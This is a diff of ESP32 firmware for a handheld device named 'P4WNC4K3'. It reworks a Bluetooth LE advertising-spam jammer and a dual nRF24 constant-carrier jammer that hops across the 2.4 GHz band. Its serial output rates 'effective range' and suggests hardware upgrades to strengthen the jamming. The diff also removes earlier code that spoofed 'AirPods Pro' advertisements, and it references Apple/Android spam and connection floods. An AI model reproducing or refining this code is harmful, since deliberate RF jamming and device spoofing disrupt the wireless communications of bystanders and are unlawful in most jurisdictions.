-  bleJamPackets = 0;
-  lastBLEJamTime = millis();
+  Serial.println("\n========== STARTING BLE JAMMER ==========");
   
-  BLEDevice::init("P4WNC4K3");
+  // ✅ FIX: Pause nRF24 to avoid SPI conflicts
+  bool wasNRFActive = nrfJammerActive;
+  if (nrfJammerActive) {
+    Serial.println("[*] Pausing nRF24 for BLE...");
+    nrfJammerActive = false;  // Just stop the loop, keep carrier on
+    delay(100);
+  }
+  
+  // Stop any conflicting operations
+  if (continuousBLEScan) {
+    continuousBLEScan = false;
+    if (pBLEScan != nullptr) {
+      pBLEScan->stop();
+      delay(100);
+    }
+  }
+  
+  // Clean up using Arduino BLE library
+  if (BLEDevice::getInitialized()) {
+    Serial.println("[*] Deinitializing existing BLE...");
+    BLEDevice::deinit(true);
+    delay(300);
+  }
+  
+  // Initialize using Arduino BLE library
+  Serial.println("[*] Initializing BLE for jammer...");
+  BLEDevice::init("P4WNC4K3_JAM");
+  
+  // Get advertising handle
   pAdvertising = BLEDevice::getAdvertising();
   
+  if (pAdvertising == nullptr) {
+    Serial.println("[!] Failed to get advertising handle");
+    addToConsole("BLE jam start failed!");
+    
+    // ✅ FIX: Resume nRF24 if it was active
+    if (wasNRFActive) {
+      delay(100);
+      nrfJammerActive = true;
+      Serial.println("[*] Resumed nRF24 jammer");
+    }
+    return;
+  }
+  
+  pAdvertising->setMinInterval(100);
+  pAdvertising->setMaxInterval(200);
+  
+  initBLEJammer();
+  
+  bleJammerActive = true;
+  bleJamPackets = 0;
+  bleDisconnectsSent = 0;
+  bleConnectFloodSent = 0;
+  lastBLEJamTime = millis();
+  current_ble_channel = 0;
+  
   currentState = BLE_JAM_ACTIVE;
-  addToConsole("BLE jammer started");
+  
+  Serial.println("[+] BLE Jammer started (STABLE MODE)");
+  Serial.println("========================================\n");
+  addToConsole("BLE jammer: STABLE");
   
   displayBLEJammerActive();
 }
@@ -4547,50 +5636,144 @@ void stopBLEJammer() {
   
   bleJammerActive = false;
   
-  if (BLEDevice::getInitialized()) {
-    BLEDevice::deinit(false);
+  Serial.println("\n[*] Stopping BLE jammer...");
+  
+  // Stop advertising FIRST
+  if (pAdvertising != nullptr) {
+    pAdvertising->stop();
+    delay(100);
   }
+  
+  // Clean shutdown using Arduino library
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
+  }
+  
+  Serial.printf("\n[+] BLE Jammer stopped\n");
+  Serial.printf("    Discovery spam packets: %d\n", bleJamPackets);
   
   addToConsole("BLE jammer stopped");
 }
 
 void performBLEJam() {
-  // BURST MODE: Send multiple packets per cycle
-  for (int burst = 0; burst < 3; burst++) {
-    char randomName[20];
-    sprintf(randomName, "JAM_%02X%02X%02X", 
-            random(0, 256), random(0, 256), random(0, 256));
-    
-    uint8_t randomMAC[6];
-    for (int i = 0; i < 6; i++) {
-      randomMAC[i] = random(0, 256);
+  if (nrfJammerActive) {
+    Serial.println("[!] ERROR: Cannot run BLE while nRF24 is active (SPI conflict)");
+    stopBLEJammer();
+    return;
+  }
+  
+  if (!bleJammerActive || pAdvertising == nullptr) return;
+  
+  static unsigned long lastJamCycle = 0;
+  static bool advertisingActive = false;
+  static uint8_t cyclePhase = 0;
+  
+  // CRITICAL: Slow down the cycle to prevent watchdog
+  // Update every 50ms instead of 2ms (25x slower = stable)
+  if (millis() - lastJamCycle < 50) return;
+  lastJamCycle = millis();
+  
+  // Feed watchdog to prevent timeout
+  esp_task_wdt_reset();
+  
+  // Phase 0: Update advertisement data
+  if (cyclePhase == 0) {
+    // Stop previous advertising
+    if (advertisingActive) {
+      pAdvertising->stop();
+      advertisingActive = false;
+      delay(10);  // CRITICAL: Give BLE stack time to cleanup
     }
     
+    // Create new advertisement data
     BLEAdvertisementData advertisementData;
-    advertisementData.setName(randomName);
-    advertisementData.setManufacturerData(std::string((char*)randomMAC, 6));
     
+    // Random device name
+    String randomName = "";
+    for (int i = 0; i < 10; i++) {
+      randomName += char('A' + random(0, 26));
+    }
+    advertisementData.setName(randomName.c_str());
+    
+    // Random manufacturer data
+    uint8_t mfgData[12];
+    for (int i = 0; i < 12; i++) {
+      mfgData[i] = random(0, 256);
+    }
+    advertisementData.setManufacturerData(std::string((char*)mfgData, 12));
+    
+    // Set data (don't start yet)
     pAdvertising->setAdvertisementData(advertisementData);
-    pAdvertising->start();
-    delayMicroseconds(100);  // Very short delay
-    pAdvertising->stop();
     
+    cyclePhase = 1;
+  }
+  // Phase 1: Start advertising
+  else if (cyclePhase == 1) {
+    pAdvertising->start();
+    advertisingActive = true;
+    bleJamPackets++;
+    
+    cyclePhase = 2;
+  }
+  // Phase 2: Let it advertise for a bit
+  else if (cyclePhase == 2) {
+    // Keep advertising for 2 cycles (100ms)
+    cyclePhase = 3;
+  }
+  // Phase 3: Prepare for next cycle
+  else {
+    cyclePhase = 0;  // Back to start
+  }
+  
+  // Small yield to let other tasks run
+  yield();
+}
+
+void performBLEJam_Continuous() {
+  if (!bleJammerActive || pAdvertising == nullptr) return;
+  
+  static unsigned long lastUpdate = 0;
+  static bool isAdvertising = false;
+  
+  // Update advertisement data every 200ms
+  if (millis() - lastUpdate < 200) return;
+  lastUpdate = millis();
+  
+  // Feed watchdog
+  esp_task_wdt_reset();
+  
+  // If not advertising yet, start it
+  if (!isAdvertising) {
+    pAdvertising->start();
+    isAdvertising = true;
     bleJamPackets++;
   }
   
-  // Add fake Apple/Android devices to pollute scan results
-  static uint8_t fakeCounter = 0;
-  if (fakeCounter % 5 == 0) {
-    BLEAdvertisementData fakeApple;
-    fakeApple.setName("AirPods Pro");
-    uint8_t appleData[] = {0x4C, 0x00, 0x12, 0x02, random(0, 256), random(0, 256)};
-    fakeApple.setManufacturerData(std::string((char*)appleData, 6));
-    pAdvertising->setAdvertisementData(fakeApple);
-    pAdvertising->start();
-    delayMicroseconds(100);
-    pAdvertising->stop();
+  // Change advertisement data WITHOUT stopping
+  // This is more stable - advertising continues in background
+  BLEAdvertisementData advertisementData;
+  
+  // Random device name
+  String randomName = "";
+  for (int i = 0; i < 10; i++) {
+    randomName += char('A' + random(0, 26));
   }
-  fakeCounter++;
+  advertisementData.setName(randomName.c_str());
+  
+  // Random manufacturer data
+  uint8_t mfgData[12];
+  for (int i = 0; i < 12; i++) {
+    mfgData[i] = random(0, 256);
+  }
+  advertisementData.setManufacturerData(std::string((char*)mfgData, 12));
+  
+  // Update while advertising (more stable)
+  pAdvertising->setAdvertisementData(advertisementData);
+  bleJamPackets++;
+  
+  // Small yield
+  yield();
 }
 
 void displayBLEJammerActive() {
@@ -4654,36 +5837,87 @@ void displayBLEJammerActive() {
 }
 
 void updateBLEJammerDisplay() {
-  int startY = HEADER_HEIGHT + 20;
-  tft.fillRect(SIDE_MARGIN, startY, BUTTON_WIDTH, 120, COLOR_BG);
-  
-  tft.setTextSize(2);
-  tft.setTextColor(COLOR_WARNING);
-  tft.setCursor(65, startY + 10);
-  tft.println("JAMMING");
+  static unsigned long lastUpdate = 0;
+  if (millis() - lastUpdate < 500) return;
+  lastUpdate = millis();
+  // Clear only the stats area to prevent flicker
+  int statsY = HEADER_HEIGHT + 35;
+  tft.fillRect(SIDE_MARGIN, statsY, 230, 150, COLOR_BG);
   
   tft.setTextSize(1);
-  tft.setTextColor(COLOR_TEXT);
+  int y = statsY;
   
-  int y = startY + 45;
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Mode: ");
-  tft.setTextColor(COLOR_ACCENT);
-  tft.println(jammerModeText);
-  
-  y += 20;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Packets: ");
-  tft.setTextColor(COLOR_WARNING);
-  tft.println(bleJamPackets);
+  // Mode
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("[*] Mode: ");
+  tft.setTextColor(COLOR_GREEN);
+  tft.println("AGGRESSIVE");
   
   y += 20;
+  
+  // Total packets
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("[*] Packets: ");
+  tft.setTextColor(COLOR_CYAN);
+  tft.printf("%d", bleJamPackets);
+  
+  unsigned long runtime = (millis() - lastBLEJamTime) / 1000;
+  if (runtime > 0) {
+    tft.setTextColor(COLOR_GREEN);
+    tft.printf(" (%d/s)", bleJamPackets / runtime);
+  }
+  
+  y += 20;
+  
+  // Disconnects sent
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("[*] Disconnects: ");
+  tft.setTextColor(COLOR_ORANGE);
+  tft.printf("%d", bleDisconnectsSent);
+  
+  y += 20;
+  
+  // Connection floods
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("[*] Conn floods: ");
+  tft.setTextColor(COLOR_PURPLE);
+  tft.printf("%d", bleConnectFloodSent);
+  
+  y += 20;
+  
+  // Current channel
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("[*] Channel: ");
+  tft.setTextColor(COLOR_CYAN);
+  tft.printf("Ch %d", ble_channels[current_ble_channel]);
+  
+  y += 20;
+  
+  // Duration
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("[*] Duration: ");
   tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Duration: ");
-  tft.setTextColor(COLOR_ACCENT);
-  tft.printf("%d sec", (millis() - lastBLEJamTime) / 1000);
+  tft.printf("%d sec", runtime);
+  
+  y += 25;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 10;
+  
+  // Status message
+  tft.setTextColor(COLOR_YELLOW);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Jamming BLE spectrum...");
+  
+  y += 12;
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Devices may disconnect");
 }
 
 // ==================== nRF24 Jammer Functions ====================
@@ -4691,188 +5925,177 @@ void updateBLEJammerDisplay() {
 void startNRFJammer() {
   if (nrfJammerActive) return;
   
+  Serial.println("\n╔═══════════════════════════════════════╗");
+  Serial.println("║   nRF24 JAMMER - SMOOCHIEE METHOD    ║");
+  Serial.println("╚═══════════════════════════════════════╝");
+  
+  // ✅ CRITICAL: Stop ALL BLE operations first (SPI conflict!)
+  if (bleJammerActive) {
+    Serial.println("[!] Stopping BLE jammer...");
+    stopBLEJammer();
+    delay(200);
+  }
+  if (appleSpamActive) {
+    stopAppleSpam();
+    delay(100);
+  }
+  if (androidSpamActive) {
+    stopAndroidSpam();
+    delay(100);
+  }
+  if (continuousBLEScan) {
+    continuousBLEScan = false;
+    if (pBLEScan != nullptr) {
+      pBLEScan->stop();
+      delay(100);
+    }
+  }
+  
+  // Ensure BLE is completely off
+  if (BLEDevice::getInitialized()) {
+    Serial.println("[*] Deinitializing BLE...");
+    BLEDevice::deinit(true);
+    delay(200);
+  }
+  
   if (!nrf1Available && !nrf2Available) {
     showMessage("No nRF24 modules!", COLOR_WARNING);
-    delay(1500);
+    Serial.println("[✗] No nRF24 radios available!");
     return;
   }
   
+  // ⭐ SMOOCHIEE METHOD: Start/Restart constant carrier
+  Serial.println("\n[*] Starting constant carrier transmission...");
+  
+  if (nrf1Available) {
+    radio1.stopConstCarrier();  // Stop if already running
+    delay(50);
+    radio1.startConstCarrier(RF24_PA_MAX, hopping_channel[0]);
+    delay(50);
+    Serial.printf("    Radio 1: Carrier ON (Ch %d)\n", hopping_channel[0]);
+  }
+  
+  if (nrf2Available) {
+    radio2.stopConstCarrier();  // Stop if already running
+    delay(50);
+    radio2.startConstCarrier(RF24_PA_MAX, hopping_channel[ptr_hop2]);
+    delay(50);
+    Serial.printf("    Radio 2: Carrier ON (Ch %d)\n", hopping_channel[ptr_hop2]);
+  }
+  
+  // Reset counters
   nrfJammerActive = true;
+  nrfTurboMode = true;
   nrfJamPackets = 0;
   nrf1Packets = 0;
   nrf2Packets = 0;
   lastNRFJamTime = millis();
+  nrfLastStats = 0;
   
-  // AGGRESSIVE SETUP - Radio 1
-  if (nrf1Available) {
-    radio1.setChannel(nrfChannel);
-    radio1.setPALevel(RF24_PA_MAX);           // Maximum power
-    radio1.setDataRate(RF24_2MBPS);           // Fastest data rate
-    radio1.setAutoAck(false);                 // No ACK (faster)
-    radio1.setCRCLength(RF24_CRC_DISABLED);   // No CRC (faster)
-    radio1.stopListening();
-    radio1.openWritingPipe(0xF0F0F0F0E1LL);
-    
-    // FLUSH TX/RX buffers for clean start
-    radio1.flush_tx();
-    radio1.flush_rx();
-  }
-  
-  // AGGRESSIVE SETUP - Radio 2
-  if (nrf2Available && dualNRFMode) {
-    radio2.setChannel(nrfChannel + 63);       // Opposite side of spectrum
-    radio2.setPALevel(RF24_PA_MAX);
-    radio2.setDataRate(RF24_2MBPS);
-    radio2.setAutoAck(false);
-    radio2.setCRCLength(RF24_CRC_DISABLED);
-    radio2.stopListening();
-    radio2.openWritingPipe(0xF0F0F0F0E2LL);
-    
-    radio2.flush_tx();
-    radio2.flush_rx();
-  }
+  // Reset sweep pattern to start position
+  flag_radio1 = 0;
+  flag_radio2 = 0;
+  nrf_ch1 = 2;
+  nrf_ch2 = 45;
   
   currentState = NRF_JAM_ACTIVE;
   
-  String modeMsg = "nRF24 jammer: ";
-  if (dualNRFMode && nrf1Available && nrf2Available) {
-    modeMsg += "DUAL AGGRESSIVE";
-  } else {
-    modeMsg += "AGGRESSIVE";
-  }
-  addToConsole(modeMsg);
+  Serial.println("\n╔═══════════════════════════════════════╗");
+  Serial.println("║         JAMMING STARTED!             ║");
+  Serial.println("╚═══════════════════════════════════════╝");
+  Serial.printf("Mode: %s\n", dualNRFMode ? "DUAL (2 radios)" : "SINGLE");
   
-  Serial.printf("[+] nRF24 Jammer started (AGGRESSIVE MODE)\n");
-  Serial.printf("    Radio 1: Ch %d (%d MHz)\n", nrfChannel, 2400 + nrfChannel);
-  if (dualNRFMode && nrf2Available) {
-    Serial.printf("    Radio 2: Ch %d (%d MHz)\n", (nrfChannel + 63) % 126, 2400 + ((nrfChannel + 63) % 126));
+  // Show jamming mode
+  const char* modeName = "";
+  switch (nrfJamMode) {
+    case NRF_SWEEP:   modeName = "SWEEP (Smoochiee)"; break;
+    case NRF_RANDOM:  modeName = "RANDOM"; break;
+    case NRF_FOCUSED: modeName = "FOCUSED (BLE)"; break;
   }
+  Serial.printf("Pattern: %s\n", modeName);
+  
+  Serial.println("\n⚡ METHOD: Constant Carrier + Channel Hop");
+  Serial.println("⚡ Expected: 50K-150K hops/sec");
+  Serial.println("⚡ TFT FROZEN - Stats to serial!");
+  Serial.println("💡 TO STOP: Tap screen or type 'nrfjam'");
+  Serial.println("───────────────────────────────────────────\n");
   
   displayNRFJammerActive();
+  addToConsole("nRF24: SMOOCHIEE MODE");
 }
 
 void stopNRFJammer() {
   if (!nrfJammerActive) return;
   
   nrfJammerActive = false;
+  nrfTurboMode = false;
+  Serial.println("\n[*] Stopping nRF24 jammer...");
   
-  if (nrf1Available) radio1.powerDown();
-  if (nrf2Available) radio2.powerDown();
-  
-  addToConsole("nRF24 jammer stopped");
-}
-
-enum NRFJamMode {
-  NRF_NORMAL,      // Original speed (5 bursts)
-  NRF_AGGRESSIVE,  // 10 bursts
-  NRF_INSANE       // 20 bursts (may cause instability)
-};
-
-NRFJamMode nrfJamMode = NRF_AGGRESSIVE;
-
-void performNRFJam_WithModes() {
-  static uint8_t hopCounter = 0;
-  
-  uint8_t jamData1[32];
-  uint8_t jamData2[32];
-  
-  // Burst count based on mode
-  int burstCount;
-  switch (nrfJamMode) {
-    case NRF_NORMAL: burstCount = 5; break;
-    case NRF_AGGRESSIVE: burstCount = 10; break;
-    case NRF_INSANE: burstCount = 20; break;
+  // ✅ Stop constant carrier properly
+  if (nrf1Available) {
+    radio1.stopConstCarrier();
+    Serial.println("    Radio 1: Carrier stopped");
+  }
+  if (nrf2Available) {
+    radio2.stopConstCarrier();
+    Serial.println("    Radio 2: Carrier stopped");
   }
   
-  for (int burst = 0; burst < burstCount; burst++) {
-    for (int i = 0; i < 32; i++) {
-      jamData1[i] = random(0, 256);
-      jamData2[i] = random(0, 256);
-    }
-    
-    if (nrf1Available) {
-      radio1.write(jamData1, 32);
-      nrf1Packets++;
-      nrfJamPackets++;
-    }
-    
-    if (nrf2Available && dualNRFMode) {
-      radio2.write(jamData2, 32);
-      nrf2Packets++;
-      nrfJamPackets++;
-    }
+  delay(100);  // Let radios settle
+  
+  // Print final statistics
+  unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
+  if (runtime == 0) runtime = 1;
+  
+  unsigned long hopsPerSec = nrfJamPackets / runtime;
+  
+  Serial.println("\n╔═══════════════════════════════════════╗");
+  Serial.println("║   JAMMING STOPPED - FINAL STATS      ║");
+  Serial.println("╚═══════════════════════════════════════╝");
+  Serial.printf("Total runtime: %lu seconds\n", runtime);
+  Serial.printf("Total hops: %lu\n", nrfJamPackets);
+  Serial.printf("Average rate: %lu hops/sec\n", hopsPerSec);
+  
+  if (nrf1Available) {
+    Serial.printf("Radio 1: %lu hops\n", nrf1Packets);
+  }
+  if (nrf2Available) {
+    Serial.printf("Radio 2: %lu hops\n", nrf2Packets);
   }
   
-  // Channel hopping
-  hopCounter++;
-  if (hopCounter % 10 == 0) {
-    nrfChannel = (nrfChannel + 1) % 126;
-    
-    if (nrf1Available) {
-      radio1.setChannel(nrfChannel);
-    }
-    if (nrf2Available && dualNRFMode) {
-      radio2.setChannel((nrfChannel + 63) % 126);
-    }
+  Serial.println("\n📊 PERFORMANCE ANALYSIS:");
+  if (hopsPerSec > 100000) {
+    Serial.println("✅ EXCELLENT - Peak performance!");
+    Serial.println("   Your hardware is working perfectly");
+    Serial.println("   Effective range: 10-20m");
+  } else if (hopsPerSec > 50000) {
+    Serial.println("✅ VERY GOOD - Strong jamming");
+    Serial.println("   Effective range: 5-15m");
+  } else if (hopsPerSec > 25000) {
+    Serial.println("✓ GOOD - Working well");
+    Serial.println("   Effective range: 3-10m");
+  } else if (hopsPerSec > 10000) {
+    Serial.println("⚠️ FAIR - Could be better");
+    Serial.println("   Check: PA+LNA modules installed?");
+    Serial.println("   Check: Capacitors on each module?");
+  } else {
+    Serial.println("✗ WEAK - Hardware problem!");
+    Serial.println("\n   TROUBLESHOOTING:");
+    Serial.println("   1. Using PA+LNA modules? (required!)");
+    Serial.println("   2. 10µF-100µF capacitors on EACH?");
+    Serial.println("   3. 3.3V stable power supply?");
+    Serial.println("   4. Good quality USB cable/charger?");
+    Serial.println("   5. Wiring matches pin definitions?");
   }
-}
-
-void performNRFJam() {
-  static unsigned long lastHopTime = 0;
-  static uint8_t hopCounter = 0;
+  Serial.println("═════════════════════════════════════════════\n");
+  Serial.println("\n💡 TIP: Tap screen or type 'nrfjam' to stop next time!\n");
   
-  // ULTRA-AGGRESSIVE: Send 10 bursts per cycle (10x more packets)
-  uint8_t jamData1[32];
-  uint8_t jamData2[32];
+  addToConsole("nRF24 stopped");
   
-  for (int burst = 0; burst < 10; burst++) {  // Changed from 5 to 10
-    // Randomize pattern each burst
-    for (int i = 0; i < 32; i++) {
-      jamData1[i] = random(0, 256);
-      jamData2[i] = random(0, 256);
-    }
-    
-    // Transmit on Radio 1
-    if (nrf1Available) {
-      radio1.write(jamData1, 32);
-      nrf1Packets++;
-      nrfJamPackets++;
-    }
-    
-    // Transmit on Radio 2 (dual mode)
-    if (nrf2Available && dualNRFMode) {
-      radio2.write(jamData2, 32);
-      nrf2Packets++;
-      nrfJamPackets++;
-    }
-    
-    // NO DELAY - maximum speed!
-  }
-  
-  // HYPER-AGGRESSIVE channel hopping (every 10 cycles instead of 20)
-  hopCounter++;
-  if (hopCounter % 10 == 0) {
-    nrfChannel = (nrfChannel + 1) % 126;
-    
-    if (nrf1Available) {
-      radio1.setChannel(nrfChannel);
-    }
-    if (nrf2Available && dualNRFMode) {
-      // Offset by 63 channels for MAXIMUM coverage
-      radio2.setChannel((nrfChannel + 63) % 126);
-    }
-  }
-  
-  // POWER BOOST: Reset every 50 cycles to maintain max power
-  if (hopCounter % 50 == 0) {
-    if (nrf1Available) {
-      radio1.setPALevel(RF24_PA_MAX);
-      radio1.setDataRate(RF24_2MBPS);
-    }
-    if (nrf2Available && dualNRFMode) {
-      radio2.setPALevel(RF24_PA_MAX);
-      radio2.setDataRate(RF24_2MBPS);
-    }
+  // Redraw menu
+  if (currentState == NRF_JAM_ACTIVE) {
+    currentState = NRF_JAM_MENU;
+    drawNRFJammerMenu();
   }
 }
 
@@ -4880,151 +6103,97 @@ void displayNRFJammerActive() {
   tft.fillScreen(COLOR_BG);
   drawTerminalHeader("nrf24 jammer");
   
-  // Live indicator
-  static bool blink = false;
-  blink = !blink;
-  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
+  // Static message - NO live updates for max speed!
+  int y = HEADER_HEIGHT + 20;
   
-  int y = HEADER_HEIGHT + 15;
-  
-  // MODE indicator
-  tft.setTextSize(1);
+  tft.setTextSize(2);
   tft.setTextColor(COLOR_ORANGE);
   tft.setCursor(SIDE_MARGIN, y);
-  tft.println("[!] AGGRESSIVE MODE");
-  y += 15;
+  tft.println("JAMMING");
   
-  // Dual mode indicator
-  if (dualNRFMode && nrf1Available && nrf2Available) {
-    tft.setTextColor(COLOR_GREEN);
-    tft.setCursor(SIDE_MARGIN, y);
-    tft.println("[+] DUAL RADIO ACTIVE");
-    y += 15;
-  }
-  
-  y += 5;
-  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
-  y += 10;
-  
-  // Radio 1 stats
-  if (nrf1Available) {
-    tft.setTextSize(1);
-    tft.setTextColor(COLOR_DARK_GREEN);
-    tft.setCursor(SIDE_MARGIN, y);
-    tft.print("[*] Radio 1:");
-    
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 75, y);
-    tft.printf("Ch %d", nrfChannel);
-    
-    y += 12;
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 75, y);
-    tft.printf("(%d MHz)", 2400 + nrfChannel);
-    
-    y += 15;
-    tft.setTextColor(COLOR_DARK_GREEN);
-    tft.setCursor(SIDE_MARGIN + 10, y);
-    tft.print("Packets: ");
-    tft.setTextColor(COLOR_CYAN);
-    tft.printf("%d", nrf1Packets);
-    
-    // Packets per second
-    tft.setTextColor(COLOR_GREEN);
-    tft.setCursor(SIDE_MARGIN + 110, y);
-    unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
-    if (runtime > 0) {
-      tft.printf("(%d/s)", nrf1Packets / runtime);
-    }
-    
-    y += 20;
-  }
-  
-  // Radio 2 stats
-  if (nrf2Available && dualNRFMode) {
-    tft.setTextColor(COLOR_DARK_GREEN);
-    tft.setCursor(SIDE_MARGIN, y);
-    tft.print("[*] Radio 2:");
-    
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 75, y);
-    tft.printf("Ch %d", (nrfChannel + 63) % 126);
-    
-    y += 12;
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 75, y);
-    tft.printf("(%d MHz)", 2400 + ((nrfChannel + 63) % 126));
-    
-    y += 15;
-    tft.setTextColor(COLOR_DARK_GREEN);
-    tft.setCursor(SIDE_MARGIN + 10, y);
-    tft.print("Packets: ");
-    tft.setTextColor(COLOR_CYAN);
-    tft.printf("%d", nrf2Packets);
-    
-    // Packets per second
-    tft.setTextColor(COLOR_GREEN);
-    tft.setCursor(SIDE_MARGIN + 110, y);
-    unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
-    if (runtime > 0) {
-      tft.printf("(%d/s)", nrf2Packets / runtime);
-    }
-    
-    y += 20;
-  }
-  
-  // Total stats
-  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
-  y += 10;
-  
-  tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(SIDE_MARGIN, y);
-  tft.print("[*] Total: ");
+  y += 30;
+  tft.setTextSize(2);
   tft.setTextColor(COLOR_GREEN);
-  tft.printf("%d packets", nrfJamPackets);
-  
-  y += 15;
-  tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
-  tft.print("[*] Rate: ");
-  tft.setTextColor(COLOR_ORANGE);
-  unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
-  if (runtime > 0) {
-    tft.printf("%d pkts/sec", nrfJamPackets / runtime);
-  } else {
-    tft.print("-- pkts/sec");
-  }
+  tft.println("ACTIVE!");
   
-  y += 15;
-  tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(SIDE_MARGIN, y);
-  tft.print("[*] Duration: ");
-  tft.setTextColor(COLOR_TEXT);
-  tft.printf("%d sec", runtime);
-  
-  y += 20;
-  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
-  y += 10;
-  
-  // Coverage info
+  y += 40;
   tft.setTextSize(1);
   tft.setTextColor(COLOR_CYAN);
   tft.setCursor(SIDE_MARGIN, y);
-  tft.print("Jamming 2.4GHz spectrum");
   
-  y += 12;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN, y);
-  if (dualNRFMode && nrf1Available && nrf2Available) {
-    tft.print("2x radios = 2x coverage!");
-  } else {
-    tft.print("Single radio mode");
+  // Show current mode
+  switch (nrfJamMode) {
+    case NRF_SWEEP:
+      tft.println("SWEEP MODE");
+      y += 12;
+      tft.setCursor(SIDE_MARGIN, y);
+      tft.setTextColor(COLOR_TEXT);
+      tft.println("(Smoochiee pattern)");
+      break;
+    case NRF_RANDOM:
+      tft.println("RANDOM MODE");
+      y += 12;
+      tft.setCursor(SIDE_MARGIN, y);
+      tft.setTextColor(COLOR_TEXT);
+      tft.println("(Chaotic hopping)");
+      break;
+    case NRF_FOCUSED:
+      tft.println("FOCUSED MODE");
+      y += 12;
+      tft.setCursor(SIDE_MARGIN, y);
+      tft.setTextColor(COLOR_TEXT);
+      tft.println("(BLE channels)");
+      break;
   }
   
-  // Instructions
+  y += 30;
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Display frozen for");
+  
+  y += 15;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("MAXIMUM PERFORMANCE");
+  
+  y += 30;
+  tft.setTextColor(COLOR_CYAN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Check serial monitor");
+  
+  y += 15;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("for live statistics");
+  
+  y += 30;
   tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(40, 285);
-  tft.print("Tap anywhere to stop");
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("Mode: ");
+  tft.setTextColor(dualNRFMode ? COLOR_GREEN : COLOR_CYAN);
+  tft.println(dualNRFMode ? "DUAL" : "SINGLE");
+  
+  y += 15;
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("Radio 1: ");
+  tft.setTextColor(nrf1Available ? COLOR_GREEN : COLOR_RED);
+  tft.println(nrf1Available ? "OK" : "OFF");
+  
+  y += 15;
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("Radio 2: ");
+  tft.setTextColor(nrf2Available ? COLOR_GREEN : COLOR_RED);
+  tft.println(nrf2Available ? "OK" : "OFF");
+  
+  // Instructions
+  int backY = 285;
+  tft.drawFastHLine(0, backY, 240, COLOR_DARK_GREEN);
+  tft.setTextColor(COLOR_RED);
+  tft.setTextSize(1);
+  tft.setCursor(50, backY + 8);
+  tft.print("Tap to stop jamming");
 }
 
 void drawBLEJammerActive() {
@@ -5089,95 +6258,98 @@ void drawBLEJammerActive() {
 }
 
 void updateNRFJammerDisplay() {
-  int startY = HEADER_HEIGHT + 20;
-  tft.fillRect(SIDE_MARGIN, startY, BUTTON_WIDTH, 140, COLOR_BG);
+  // This function is called in loop() for live updates
+  // Only update the dynamic stats area to prevent flicker
   
-  tft.setTextSize(2);
-  tft.setTextColor(COLOR_WARNING);
-  int headerY = startY + 10;
+  if (currentState != NRF_JAM_ACTIVE || !nrfJammerActive) return;
   
-  if (dualNRFMode && nrf1Available && nrf2Available) {
-    tft.setCursor(45, headerY);
-    tft.println("DUAL MODE");
-    headerY += 25;
-    tft.setTextSize(1);
-    tft.setTextColor(COLOR_ACCENT);
-    tft.setCursor(75, headerY);
-    tft.println("2x POWER");
-  } else {
-    tft.setCursor(65, headerY);
-    tft.println("JAMMING");
-  }
+  int statsY = HEADER_HEIGHT + 85;  // Position of stats area
+  int leftColX = SIDE_MARGIN;
+  int rightColX = 130;
   
+  // Clear ONLY the stats numbers area (not labels)
+  tft.fillRect(leftColX, statsY + 12, 120, 15, COLOR_BG);
+  tft.fillRect(rightColX, statsY + 12, 110, 15, COLOR_BG);
+  
+  // Update hop count
+  tft.setTextColor(COLOR_ORANGE);
   tft.setTextSize(1);
-  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(leftColX, statsY + 12);
+  tft.printf("%-8d", nrfJamPackets);
   
-  int y = headerY + 25;
-  
-  // Radio 1 status
-  if (nrf1Available) {
-    tft.setCursor(SIDE_MARGIN + 5, y);
-    tft.print("Radio 1 Ch: ");
-    tft.setTextColor(COLOR_ACCENT);
-    tft.print(nrfChannel);
-    tft.setTextColor(COLOR_TEXT);
